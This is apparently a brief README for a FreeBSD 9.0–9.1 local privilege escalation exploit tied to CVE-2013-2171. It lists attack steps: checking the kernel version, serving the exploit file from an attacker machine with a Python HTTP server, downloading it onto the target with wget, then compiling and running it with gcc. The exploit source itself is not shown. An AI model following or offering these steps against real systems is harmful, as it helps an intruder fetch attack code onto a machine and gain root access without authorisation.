# FreeBSD-9.0-9.1 - Privilege-Escalation
CVE-2013-2171

By fbsd9lul@hunger.hu

## How to Exploit!

**1° Check the kernel version**

```
uname -a

FreeBSD freebsd 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012
```

**2° Transfer this file to target**

```
Attacker machine -> python3 -m http.server 8080

Target machine -> wget IP:8080/26368.c
```

**3° Use GCC to compile the code**

```gcc 26368.c -o exploit```

**4° Run the exploit**

```./exploit```
